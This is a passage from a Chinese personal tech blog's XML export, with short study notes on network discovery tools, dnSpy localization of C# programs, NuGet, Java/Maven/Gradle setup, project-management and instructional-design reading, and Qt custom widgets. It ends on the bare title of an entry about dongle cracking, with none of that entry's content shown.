<h1 id="Traceroute"><a href="#Traceroute" class="headerlink" title="Traceroute"></a>Traceroute</h1><p>Traceroute命令是TCP/IP家族内另一个比较早的工具，它可用来发现测试点 和目标主机之间的路由器。路由器在转发包之前总是将其TTL值减1，如果TTL降为0，则路由器向源地址发送TTL-Expired ICMP消息。</p>
<h1 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h1><p>Ping命令是IP网上最古老的一种工具，用来监测网络节点是否活着，或用于监测到网络节点间的往返时延（RTT）。通常Ping只涉及网络上的源和目的两节点，而忽略网络细节。另外我们可以使用广播 Ping，其Ping的地址不是一个单一的地址，而是子网的广播地址，所有位于该子网的主机均对此Ping包进行响应，从而一次就可得到子网内的全部活动主机。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://patents.google.com/patent/CN103490926A/zh" target="_blank" rel="noopener">一种网络拓扑自动获取的方法</a>,by 马黎黎,梁鹏飞.</li>
<li><a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/SNMP.html" target="_blank" rel="noopener">什么是SNMP？</a>,by huawei.</li>
<li><a href="https://zh.wikipedia.org/zh-cn/Nmap" target="_blank" rel="noopener">Nmap</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>C#程序汉化方法</title>
    <url>/2023/10/26/CSharp%E7%A8%8B%E5%BA%8F%E6%B1%89%E5%8C%96%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>可使用dnspy工具对C#程序进行汉化。</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>dnSpy 是一个调试器和 .NET 程序集编辑器。即使您没有任何可用的源代码，您也可以使用它来编辑和调试程序集。主要特点：</p>
<ul>
<li>调试 .NET 和 Unity 程序集</li>
<li>编辑 .NET 和 Unity 程序集</li>
<li>浅色和深色主题</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.bilibili.com/read/cv12067073/" target="_blank" rel="noopener">成为汉化工吧！特辑 - 使用dnsPy汉化.NET程序~初体验</a>,by 花开开不开.</li>
<li><a href="https://github.com/dnSpy/dnSpy" target="_blank" rel="noopener">dnSpy readme</a>,by dnspy.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title>C#之NuGet打包和离线安装</title>
    <url>/2023/04/08/CSharp%E4%B9%8BNuGet%E6%89%93%E5%8C%85%E5%92%8C%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>最近研究一个C#开源项目，发现在离线的情况下无法顺利编译链接，其原因是缺乏NuGet安装的程序集。因此研究一下NuGet打包和离线安装的方法。</p>
<h1 id="NuGet简介"><a href="#NuGet简介" class="headerlink" title="NuGet简介"></a>NuGet简介</h1><p>NuGet是一个自由开源软件包管理系统。用于Microsoft开发平台。以前称NuPack。 2010年首次发布。已经进化为一个庞大的工具与服务生态系统。</p>
<h1 id="下载Nuget程序包"><a href="#下载Nuget程序包" class="headerlink" title="下载Nuget程序包"></a>下载Nuget程序包</h1><ol>
<li><p>进入Nuget官网：<a href="https://www.nuget.org/，" target="_blank" rel="noopener">https://www.nuget.org/，</a></p>
</li>
<li><p>搜索框里搜索需要的安装包，例如MaterialDesignThemes，一个主题包，点击自己所需的安装包。</p>
</li>
</ol>
<h1 id="NuGet离线安装软件包"><a href="#NuGet离线安装软件包" class="headerlink" title="NuGet离线安装软件包"></a>NuGet离线安装软件包</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.51cto.com/u_15127642/2755009" target="_blank" rel="noopener">C# NuGet打包和离线安装</a>,by mob604756fda125.</li>
<li><a href="https://zhuanlan.zhihu.com/p/36207092" target="_blank" rel="noopener">NuGet是什么？理解与使用（上）</a>,by 6号咸鱼.</li>
<li><a href="https://blog.csdn.net/u014453443/article/details/112463621" target="_blank" rel="noopener">Visual Studio NuGet离线安装包</a>,by 苏守坤.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title>Java开发运行环境配置</title>
    <url>/2023/11/06/Java%E5%BC%80%E5%8F%91%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>想了解一下Java后端开发，故记录一下Java开发运行环境配置。</p>
<h1 id="Java安装配置"><a href="#Java安装配置" class="headerlink" title="Java安装配置"></a>Java安装配置</h1><p>JDK安装完毕后，重点要配置 JAVA_HOME、PATH、CLASSPATH 三个环境变量，请参考<a href="https://www.cnblogs.com/cnwutianhao/p/5487758.html" target="_blank" rel="noopener">Win10下 Java环境变量配置</a>。</p>
<ul>
<li>JAVA_HOME 配置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 示例</span><br><span class="line">C:\Java\jdk1.8.0_91</span><br></pre></td></tr></table></figure>

<ul>
<li>PATH 配置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 示例</span><br><span class="line">%Java_Home%\bin;%Java_Home%\jre\bin;</span><br></pre></td></tr></table></figure>

<ul>
<li>CLASSPATH 配置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 示例</span><br><span class="line">.;%Java_Home%\bin;%Java_Home%\lib\dt.jar;%Java_Home%\lib\tools.jar</span><br></pre></td></tr></table></figure>

<h2 id="OpenJDK与JDK区别"><a href="#OpenJDK与JDK区别" class="headerlink" title="OpenJDK与JDK区别"></a>OpenJDK与JDK区别</h2><p>OpenJDK和Oracle JDK之间最大的区别是许可。OpenJDK 是完全开源的Java，采用GNU 通用公共许可证。Oracle JDK需要在Oracle二进位代码许可协定下获得商业许可。</p>
<h2 id="JDK版本选择"><a href="#JDK版本选择" class="headerlink" title="JDK版本选择"></a>JDK版本选择</h2><blockquote>
<p>JDK的两个大版本是Oracle JDK和Open JDK，都属于Oracle。Oracle收购了SUN。Oracle JDK是Oracle基于免费的商业许可证版本。Open JDK是Oracle在开源许可证下的免费版本。</p>
</blockquote>
<p>LTS（Long-term Support）即长期支持。目前可选的JDK LTS版本主要有：8、11、17、21。</p>
<p>推荐使用JDK LTS17。因为如果需求要用的SpringBoot3版本的话，那也必须要使用JDK17及以上版本了。</p>
<h2 id="Spring-Initializr"><a href="#Spring-Initializr" class="headerlink" title="Spring Initializr"></a>Spring Initializr</h2><p>Spring Initializr 从本质上来说就是一个Web应用程序，它能为你生成Spring Boot项目结构。虽然不能生成应用程序代码，但它能为你提供一个基本的项目结构，以及一个用于构建代码的Maven或Gradle构建说明文件。</p>
<p>使用 Spring Initializr 创建项目的步骤如下：</p>
<ol>
<li>打开浏览器，在浏览器地址栏输入 <a href="https://start.spring.io" target="_blank" rel="noopener">https://start.spring.io</a>  地址。</li>
</ol>
<p>目前 Spring Initializr 只支持 Sprint Boot 3以上，JDK 17以上，不便于在Win7上开发。需要创建支持 Sprint Boot 2 和 JDK 1.8版本的项目，具体方法请参考：</p>
<ul>
<li><a href="https://stackoverflow.com/questions/77538583/did-spring-initializr-stop-support-for-spring-boot-2-x" target="_blank" rel="noopener">Did spring initializr stop support for spring boot 2.X?</a></li>
<li><a href="https://stackoverflow.com/questions/36427868/failed-to-execute-goal-org-apache-maven-pluginsmaven-surefire-plugin2-12test" target="_blank" rel="noopener">Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:2.12:test (default-test) on project</a></li>
</ul>
<ol start="2">
<li>下载Spring Initializr创建的 Spring Boot 脚手架项目，解压缩，修改目录中的 pom.xml。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  &lt;parent&gt;</span><br><span class="line">	&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;spring-boot-starter-parent&lt;&#x2F;artifactId&gt;</span><br><span class="line">	&lt;version&gt;2.7.13&lt;&#x2F;version&gt;</span><br><span class="line">	&lt;relativePath&#x2F;&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class="line">&lt;&#x2F;parent&gt;</span><br><span class="line">  &lt;properties&gt;</span><br><span class="line">	&lt;java.version&gt;1.8&lt;&#x2F;java.version&gt;</span><br><span class="line">&lt;&#x2F;properties&gt;</span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  &lt;build&gt;</span><br><span class="line">	&lt;plugins&gt;</span><br><span class="line">		&lt;plugin&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-maven-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">		&lt;&#x2F;plugin&gt;</span><br><span class="line">		&lt;plugin&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;maven-surefire-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">			&lt;version&gt;2.19.1&lt;&#x2F;version&gt;</span><br><span class="line">			&lt;configuration&gt;</span><br><span class="line">				&lt;testFailureIgnore&gt;true&lt;&#x2F;testFailureIgnore&gt;</span><br><span class="line">			&lt;&#x2F;configuration&gt;</span><br><span class="line">		&lt;&#x2F;plugin&gt;</span><br><span class="line">	&lt;&#x2F;plugins&gt;</span><br><span class="line">&lt;&#x2F;build&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Maven安装配置"><a href="#Maven安装配置" class="headerlink" title="Maven安装配置"></a>Maven安装配置</h1><p>Maven安装完毕后，重点要配置 MAVEN_HOME和PATH两个环境变量，请参考<a href="https://www.cnblogs.com/lenve/p/12047793.html" target="_blank" rel="noopener">学Maven，这篇万余字的教程，真的够用了！</a>。</p>
<h2 id="Maven本地仓库配置"><a href="#Maven本地仓库配置" class="headerlink" title="Maven本地仓库配置"></a>Maven本地仓库配置</h2><p>Maven 仓库是项目中依赖的第三方库，这个库所在的位置叫做仓库。</p>
<p>Maven 仓库有三种类型：</p>
<ul>
<li>本地（local）</li>
<li>中央（central）</li>
<li>远程（remote）</li>
</ul>
<p>Maven 本地仓库默认被创建在 %USER_HOME% 目录下。要修改默认位置，在 %M2_HOME%\conf 目录中的 Maven 的 settings.xml 文件中定义另一个路径。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;settings xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;SETTINGS&#x2F;1.0.0&quot;</span><br><span class="line">   xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">   xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;SETTINGS&#x2F;1.0.0 </span><br><span class="line">   http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;settings-1.0.0.xsd&quot;&gt;</span><br><span class="line">      &lt;localRepository&gt;C:&#x2F;MyLocalRepository&lt;&#x2F;localRepository&gt;</span><br><span class="line">&lt;&#x2F;settings&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Maven常用命令说明"><a href="#Maven常用命令说明" class="headerlink" title="Maven常用命令说明"></a>Maven常用命令说明</h2><table>
<thead>
<tr>
<th>常用命令</th>
<th>中文含义</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>mvn clean</td>
<td>清理</td>
<td>这个命令可以用来清理已经编译好的文件</td>
</tr>
<tr>
<td>mvn compile</td>
<td>编译</td>
<td>将 Java 代码编译成 Class 文件</td>
</tr>
<tr>
<td>mvn test</td>
<td>测试</td>
<td>项目测试</td>
</tr>
<tr>
<td>mvn package</td>
<td>打包</td>
<td>根据用户的配置，将项目打成 jar 包或者 war 包</td>
</tr>
<tr>
<td>mvn install</td>
<td>安装</td>
<td>手动向本地仓库安装一个 jar</td>
</tr>
<tr>
<td>mvn deploy</td>
<td>上传</td>
<td>将 jar 上传到私服</td>
</tr>
</tbody></table>
<h1 id="Gradle安装配置"><a href="#Gradle安装配置" class="headerlink" title="Gradle安装配置"></a>Gradle安装配置</h1><p>请参考：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/570009095" target="_blank" rel="noopener">Gradle入门教程(IDEA使用)</a></li>
<li><a href="https://juejin.cn/post/6939662617224937503" target="_blank" rel="noopener">Gradle 系列 （一）、Gradle相关概念理解，Groovy基础</a></li>
</ul>
<blockquote>
<p>在IDEA中创建Gradle项目时，会自动生成gradle文件夹，其中就包括gradle-wrapper.properties，IDEA默认使用gradle wrapper来创建项目，所以无需安装gradle也可以正常运行。gradle wrapper的优点之一就是可以自定义下载的gradle的版本，如果是团队协作的话，这个功能就非常方便，简单设置即可统一团队的构建工具版本。</p>
</blockquote>
<blockquote>
<p>当然，如果你想使用gradle的全局命令的话，还需要你自行修改环境变量配置，需要你到配置的gradle文件夹中找到wrapper文件夹一步步找到对应版本的bin文件夹，并添加到环境变量</p>
</blockquote>
<blockquote>
<p>gradle-wrapper.properties文件内容</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">distributionBase&#x3D;GRADLE_USER_HOME</span><br><span class="line">distributionPath&#x3D;wrapper&#x2F;dists</span><br><span class="line">distributionUrl&#x3D;https\:&#x2F;&#x2F;services.gradle.org&#x2F;distributions&#x2F;gradle-8.5-bin.zip</span><br><span class="line">networkTimeout&#x3D;10000</span><br><span class="line">validateDistributionUrl&#x3D;true</span><br><span class="line">zipStoreBase&#x3D;GRADLE_USER_HOME</span><br><span class="line">zipStorePath&#x3D;wrapper&#x2F;dists</span><br></pre></td></tr></table></figure>

<h1 id="Tomcat安装配置"><a href="#Tomcat安装配置" class="headerlink" title="Tomcat安装配置"></a>Tomcat安装配置</h1><p>Apache Tomcat 是Java Servlet、JavaServer Pages （JSP）、Java表达式语言和Java的WebSocket技术的一个开源实现 ,通常我们将Tomcat称为Web容器或者Servlet容器 。其安装过程请参考：</p>
<ul>
<li><a href="https://juejin.cn/post/6917982543228698637" target="_blank" rel="noopener">保姆级 tomcat 快速入门教程</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/cnwutianhao/p/5487758.html" target="_blank" rel="noopener">Win10下 Java环境变量配置</a>,by Tyhoo_Wu.</li>
<li><a href="https://www.cnblogs.com/lenve/p/12047793.html" target="_blank" rel="noopener">学Maven，这篇万余字的教程，真的够用了！</a>,by 江南一点雨.</li>
<li><a href="https://zhuanlan.zhihu.com/p/62841181" target="_blank" rel="noopener">Maven最全教程，看了必懂</a>,by 小知​.</li>
<li><a href="https://blog.csdn.net/qq_44757034/article/details/120238561" target="_blank" rel="noopener">Java之Maven【IDEA版】入门到精通（一篇文章精通系列）</a>,by 程序员小杰#.</li>
<li><a href="https://zhuanlan.zhihu.com/p/98746476" target="_blank" rel="noopener">快速入门Maven第一天(使用Maven构建普通项目和WEB项目)</a>,by 思冉.</li>
<li><a href="https://www.51cto.com/article/721712.html" target="_blank" rel="noopener">Gradle大战Maven，胜负已分？</a>,by 爱科学的卫斯理.</li>
<li><a href="https://www.cnblogs.com/cangqinglang/p/9340962.html" target="_blank" rel="noopener">Maven学习总结(三)——使用Maven构建项目</a>,by 苍青浪.</li>
<li><a href="https://maven.apache.org/plugins/index.html" target="_blank" rel="noopener">Maven Available Plugins</a>,by apache.</li>
<li><a href="https://www.cnblogs.com/LUA123/p/11189069.html" target="_blank" rel="noopener">SpringBoot+Vue前后端分离项目，maven package自动打包整合</a>,by 露娜妹.</li>
<li><a href="https://www.javainsoft.com/javase/openjdk/" target="_blank" rel="noopener">OpenJDK下载安装前你应该要知道的5件事</a>,by javase.</li>
<li><a href="https://blog.csdn.net/u014454538/article/details/130735582" target="_blank" rel="noopener">Open JDK下载</a>,by 晓之木初.</li>
<li><a href="https://developer.aliyun.com/article/1143607" target="_blank" rel="noopener">Java中JDK8、JDK11、JDK17，该怎么选择？</a>,by aliyun.</li>
<li><a href="https://zh.wikipedia.org/wiki/Java%E7%89%88%E6%9C%AC%E6%AD%B7%E5%8F%B2" target="_blank" rel="noopener">Java版本历史</a>,by wiki.</li>
<li><a href="https://blog.csdn.net/program_highway/article/details/124196937" target="_blank" rel="noopener">JDK的两个大版本，为什么要选LTS</a>,by 编程还未.</li>
<li><a href="https://stackoverflow.com/questions/77538583/did-spring-initializr-stop-support-for-spring-boot-2-x" target="_blank" rel="noopener">Did spring initializr stop support for spring boot 2.X?</a>,by stackoverflow.</li>
<li><a href="https://stackoverflow.com/questions/36427868/failed-to-execute-goal-org-apache-maven-pluginsmaven-surefire-plugin2-12test" target="_blank" rel="noopener">Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:2.12:test (default-test) on project</a>,by stackoverflow.</li>
<li><a href="http://www.huangbowen.net/blog/2016/01/29/understand-official-version-and-snapshot-version-in-maven/" target="_blank" rel="noopener">理解Maven中的SNAPSHOT版本和正式版本</a>,by huangbowen.</li>
<li><a href="https://blog.csdn.net/x_Lyric/article/details/121921716" target="_blank" rel="noopener">win7系统Tomcat8安装步骤</a>,by x_Lyric.</li>
<li><a href="https://juejin.cn/post/6917982543228698637" target="_blank" rel="noopener">保姆级 tomcat 快速入门教程</a>,by 田维常.</li>
<li><a href="https://juejin.cn/post/6972423148742377508" target="_blank" rel="noopener">Groovy DSL 设计之道</a>,by 花花子.</li>
<li><a href="https://juejin.cn/post/6939662617224937503" target="_blank" rel="noopener">Gradle 系列 （一）、Gradle相关概念理解，Groovy基础</a>,by sweetying.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>信息系统项目管理师教程读书笔记</title>
    <url>/2023/11/14/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E5%B8%88%E6%95%99%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>记录信息系统项目管理师的相关知识。</p>
<h1 id="十二个项目管理原则"><a href="#十二个项目管理原则" class="headerlink" title="十二个项目管理原则"></a>十二个项目管理原则</h1><ul>
<li>勤勉、尊重和关心他人</li>
<li>营造协作的项目管理团队环境</li>
<li>促进干系人有效参与</li>
<li>聚焦于价值</li>
<li>识别、评估和响应系统交互</li>
<li>展现领导力行为</li>
<li>根据环境进行裁剪</li>
<li>将质量融入到过程和成果中</li>
<li>驾驭复杂性</li>
<li>优化风险应对</li>
<li>拥抱适应性和韧性</li>
<li>为实现目标而驱动变革</li>
</ul>
<h1 id="五大过程组"><a href="#五大过程组" class="headerlink" title="五大过程组"></a>五大过程组</h1><ul>
<li>启动过程组</li>
<li>规划过程组</li>
<li>执行过程组</li>
<li>监督过程组</li>
<li>收尾过程组</li>
</ul>
<h1 id="十大知识域"><a href="#十大知识域" class="headerlink" title="十大知识域"></a>十大知识域</h1><ul>
<li>项目整合管理</li>
<li>项目范围管理</li>
<li>项目进度管理</li>
<li>项目成本管理</li>
<li>项目质量管理</li>
<li>项目资源管理</li>
<li>项目沟通管理</li>
<li>项目风险管理</li>
<li>项目采购管理</li>
<li>项目干系人管理</li>
</ul>
<h1 id="八大绩效域"><a href="#八大绩效域" class="headerlink" title="八大绩效域"></a>八大绩效域</h1><ul>
<li>干系人绩效域</li>
<li>团队绩效域</li>
<li>开发方法和生命周期绩效域</li>
<li>规划绩效域</li>
<li>项目工作绩效域</li>
<li>交付绩效域</li>
<li>测量绩效域</li>
<li>不确定性绩效域</li>
</ul>
<h1 id="项目生命周期"><a href="#项目生命周期" class="headerlink" title="项目生命周期"></a>项目生命周期</h1><ul>
<li>启动项目</li>
<li>组织与准备</li>
<li>执行项目工作</li>
<li>结束项目</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.ruankao.org.cn/book/lists" target="_blank" rel="noopener">信息系统项目管理师教程</a>,by ruankao.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>管理</tag>
      </tags>
  </entry>
  <entry>
    <title>教学设计原理读书笔记</title>
    <url>/2023/11/14/%E6%95%99%E5%AD%A6%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="教学系统导论"><a href="#教学系统导论" class="headerlink" title="教学系统导论"></a>教学系统导论</h1><h2 id="教学设计导论"><a href="#教学设计导论" class="headerlink" title="教学设计导论"></a>教学设计导论</h2><p>加涅的学习理论主要倾向于用信息加工的模式来解释学习活动，他认为学习过程是信息的接受和使用过程，学习是主体和环境相互作用的结果。其理论的一大特点是注重实际应用，能够很好地将学习理论研究的结果运用于教学实践。</p>
<p>加涅认为学习的典型模式是学习与记忆的信息加工模式。在这一模式中，外界环境中的刺激通过感受器转变为神经信息到达感觉记录器，其中部分被感觉登记了的信息进入到短时记忆。短时记忆里的信息经过编码贮存在长时记忆里，当信息需要使用时，通过检索，从长时记忆中提取出来。信息被提取后有的直接通向反应发生器，有的又回到短时记忆，在短时记忆中对提取出的信息进行核实确认，合适的则通向反应发生器，反之回到长时记忆中进行再次提取。这些成功提取出来的信息最终通过效应器作用于环境。除此以外，该模式还包括执行控制和预期两个部分，它们影响着信息加工的整个过程，是信息加工模式中的重要结构，其中执行控制与知觉策略起着调节和控制作用，预期（动机）起着学习定向作用。</p>
<h2 id="设计教学系统"><a href="#设计教学系统" class="headerlink" title="设计教学系统"></a>设计教学系统</h2><p>典型的教学系统设计模型：</p>
<ul>
<li>ADDIE模型：分析（analysis）、设计（design）、开发（development）、实施（implementation）和评价（evaluation）。</li>
</ul>
<h1 id="学习和教学的基本过程"><a href="#学习和教学的基本过程" class="headerlink" title="学习和教学的基本过程"></a>学习和教学的基本过程</h1><h2 id="教学的结果"><a href="#教学的结果" class="headerlink" title="教学的结果"></a>教学的结果</h2><h2 id="学习的类型"><a href="#学习的类型" class="headerlink" title="学习的类型"></a>学习的类型</h2><ul>
<li>智慧技能</li>
<li>认知策略</li>
<li>信息</li>
<li>态度</li>
<li>动作技能</li>
</ul>
<h2 id="学习者"><a href="#学习者" class="headerlink" title="学习者"></a>学习者</h2><h1 id="设计教学"><a href="#设计教学" class="headerlink" title="设计教学"></a>设计教学</h1><h2 id="确定表现性目标"><a href="#确定表现性目标" class="headerlink" title="确定表现性目标"></a>确定表现性目标</h2><h2 id="学习任务分析"><a href="#学习任务分析" class="headerlink" title="学习任务分析"></a>学习任务分析</h2><h2 id="设计教学顺序"><a href="#设计教学顺序" class="headerlink" title="设计教学顺序"></a>设计教学顺序</h2><h2 id="教学事件"><a href="#教学事件" class="headerlink" title="教学事件"></a>教学事件</h2><p>教学即经过设计的、外在于学习者的一套支持内部学习过程的事件。设计教学事件是用来激活信息加工过程，或者至少和信息加工过程同时发生并支持加工过程的。</p>
<p>教学事件：</p>
<ol>
<li>引起注意</li>
<li>告知学习目标</li>
<li>激起对习得的先决性能的回忆</li>
<li>呈现刺激材料</li>
<li>提供学习指导</li>
<li>引出行为表现</li>
<li>提供行为表现正确性的反馈</li>
<li>测量行为表现</li>
<li>促进保持和迁移</li>
</ol>
<h2 id="技术-潜在用途"><a href="#技术-潜在用途" class="headerlink" title="技术-潜在用途"></a>技术-潜在用途</h2><h2 id="单节课的设计"><a href="#单节课的设计" class="headerlink" title="单节课的设计"></a>单节课的设计</h2><p>备课的步骤：</p>
<ol>
<li>陈述课的目标及其类型（即学习领域）；</li>
<li>列出打算使用的教学事件；</li>
<li>列出每一个教学事件赖以完成的媒体、材料及活动；</li>
<li>注明每个所选事件中教师或培训者的作用和各种活动（教学的处方）。</li>
</ol>
<h2 id="测量学生的行为表现"><a href="#测量学生的行为表现" class="headerlink" title="测量学生的行为表现"></a>测量学生的行为表现</h2><p>评价类型：</p>
<ul>
<li>标准参照评价，例如目标参照测验</li>
<li>常模参照评价，例如常模参照测验</li>
</ul>
<h1 id="教学传输系统"><a href="#教学传输系统" class="headerlink" title="教学传输系统"></a>教学传输系统</h1><h2 id="集体学习环境"><a href="#集体学习环境" class="headerlink" title="集体学习环境"></a>集体学习环境</h2><h2 id="在线学习"><a href="#在线学习" class="headerlink" title="在线学习"></a>在线学习</h2><h2 id="教学评价"><a href="#教学评价" class="headerlink" title="教学评价"></a>教学评价</h2><p>评价活动贯穿整个教学系统设计过程，包括实施与维护阶段。教学系统评价至少包括以下五种类型：</p>
<ul>
<li>教学材料评价</li>
<li>教学系统设计过程的质量评论</li>
<li>学习者对教学的反应的测量</li>
<li>学习者在学习目标上的成就测量</li>
<li>教学效果的估计</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://book.douban.com/subject/30354111/" target="_blank" rel="noopener">教学设计原理（第五版修订本）</a>,by douban.</li>
<li><a href="https://baike.baidu.com/item/%E5%8A%A0%E6%B6%85%E4%BF%A1%E6%81%AF%E5%8A%A0%E5%B7%A5%E6%A8%A1%E5%BC%8F/22118415" target="_blank" rel="noopener">加涅信息加工模式</a>,by baidu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>管理</tag>
        <tag>教学</tag>
      </tags>
  </entry>
  <entry>
    <title>QT自定义控件及使用方法</title>
    <url>/2023/11/30/QT%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8E%A7%E4%BB%B6%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Qt自带控件有时候不满足个性化的需求，需要自定义控件。如果自定义控件比较通用，最好在QT Designer下显示，以方便使用。最后介绍在Qt Creator中测试验证自定义控件。</p>
<h1 id="Qt-Creator编写自定义控件"><a href="#Qt-Creator编写自定义控件" class="headerlink" title="Qt Creator编写自定义控件"></a>Qt Creator编写自定义控件</h1><p>在Qt Creator编写自定义控件可使用 “Qt4 设计师自定义控件” 模板工程，具体可参考：</p>
<ul>
<li><a href="https://www.jianshu.com/p/17e8e2a275f6" target="_blank" rel="noopener">Qt创建Qt Designer自定义控件及使用</a></li>
</ul>
<p>需要注意的是：</p>
<ul>
<li>自定义控件的编译器应选择与编译生成Qt Creater应用的编译器相同。例如：在Windows平台，一般使用MSVC 32位编译器。当然可以不一定完全相同，例如MSVC 2015 32位编译器和MSVC 2017 32位编译器编译的自定义控件DLL可以通用。</li>
<li>自定义控件类的声明中不需要使用 QDESIGNER_WIDGET_EXPORT 导出宏，否则后面使用自定义控件时将报错。</li>
</ul>
<h1 id="Qt-Designer显示自定义控件"><a href="#Qt-Designer显示自定义控件" class="headerlink" title="Qt Designer显示自定义控件"></a>Qt Designer显示自定义控件</h1><p>自定义控件编译链接后的Release目录中，将产生自定义控件的dll，将该dll拷贝至Qt Creator的插件目录，例如：</p>
<ul>
<li>D:\Qt\Qt5.12.0\Tools\QtCreator\bin\plugins\designer</li>
</ul>
<p>之后重启Qt Creator，创建Qt Widgets Application，打开Qt Designer，在其自定义窗口部件中即可发现自定义控件的图标。此外还需将自定义控件的头文件放到编译器的include目录，以msvc为例：</p>
<ul>
<li>D:\Qt\Qt5.12.0\5.12.0\msvc2017\include\MyLabel\mylabel.h</li>
</ul>
<h1 id="Qt-Creator测试自定义控件"><a href="#Qt-Creator测试自定义控件" class="headerlink" title="Qt Creator测试自定义控件"></a>Qt Creator测试自定义控件</h1><p>打开Qt Creator，创建Qt Widgets Application 应用，打开Qt Designer，使用自定义控件，然后编译链接，将报如下错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mainwindow.obj:-1: error: LNK2019: 无法解析的外部符号 &quot;public: __thiscall MyLabel::MyLabel(class QWidget *)&quot; (??0MyLabel@@QAE@PAVQWidget@@@Z)，该符号在函数 &quot;public: void __thiscall Ui_MainWindow::setupUi(class QMainWindow *)&quot; (?setupUi@Ui_MainWindow@@QAEXPAVQMainWindow@@@Z) 中被引用</span><br></pre></td></tr></table></figure>

<p>其原因是没有将自定义控件包含到测试自定义控件的工程中。</p>
<ul>
<li>拷贝mylabel.h、mylabel.cpp、mylabel.pri到新建工程目录下，在新建工程pro文件中添加include(mylabel.pri)</li>
<li>右键工程清除、执行qmake、重新构建应该就解决该编译链接错误了</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.jianshu.com/p/17e8e2a275f6" target="_blank" rel="noopener">Qt创建Qt Designer自定义控件及使用</a>,by BrokenRainK.</li>
<li><a href="https://www.cnblogs.com/dingc-jc/p/9969658.html" target="_blank" rel="noopener">Qt Designer 插件测试报错问题</a>,by  翻滚的雪球.</li>
<li><a href="https://stackoverflow.com/questions/45134809/qcalendarwidget-how-to-highlight-dates" target="_blank" rel="noopener">QCalendarWidget - How to Highlight Dates</a>,by stackoverflow.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>加密狗破解原理与方法分析</title>
